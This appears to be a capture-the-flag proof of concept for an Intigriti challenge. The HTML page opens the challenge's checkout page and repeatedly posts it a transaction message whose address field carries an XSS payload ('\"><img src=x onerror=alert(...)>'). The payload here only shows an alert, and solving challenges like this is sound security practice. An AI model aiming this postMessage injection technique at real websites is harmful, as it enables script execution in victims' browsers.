<html>
<body style="height:100vh; cursor:pointer;">
<script>
let win = null;

document.addEventListener("click", () => {
    if (!win) {
        win = window.open(
            "https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=45000",
            "_blank"
        );
    }
});

setInterval(() => {
    if (win) {
        win.postMessage({
            type: "submitTransaction",
            transaction: {
                toAddress: "\"><img src=x onerror=alert(document.domain)>",
                currency: "1337COIN",
                amount: 1
            }
        }, "*");
    }
}, 1000);
</script>
</body>
</html>
